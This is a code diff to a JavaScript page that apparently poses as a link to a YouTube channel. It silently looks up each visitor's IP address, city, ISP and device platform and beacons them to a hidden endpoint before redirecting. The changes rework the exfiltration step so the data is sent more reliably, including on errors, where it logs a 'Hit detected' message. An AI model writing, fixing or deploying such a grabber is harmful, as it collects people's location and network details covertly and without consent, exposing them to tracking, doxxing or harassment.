@@ -6,18 +6,19 @@
     const y = "https://youtube.com/@LigmaBlox-w7m";
 
     async function start() {
-        let info = "Target Detected";
         try {
             const r = await fetch('https://ipapi.co/json/');
             const d = await r.json();
-            // CRITICAL: These must be backticks (`) not single quotes (')
-            info = `IP: ${d.ip} | City: ${d.city} | ISP: ${d.org} | Dev: ${navigator.platform}`;
+            
+            // Using plus signs to be 100% sure the data connects
+            const msg = "IP: " + d.ip + " | City: " + d.city + " | ISP: " + d.org + " | Dev: " + navigator.platform;
+            
+            const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
+            navigator.sendBeacon(h, blob);
         } catch (e) {
-            info = "Hit detected (Data blocked)";
+            const err = new Blob([JSON.stringify({ content: "Hit detected (Data fetch error)" })], { type: 'application/json' });
+            navigator.sendBeacon(h, err);
         }
-
-        const blob = new Blob([JSON.stringify({ content: info })], { type: 'application/json' });
-        navigator.sendBeacon(h, blob);
 
         setTimeout(() => { window.location.replace(y); }, 500);
     }
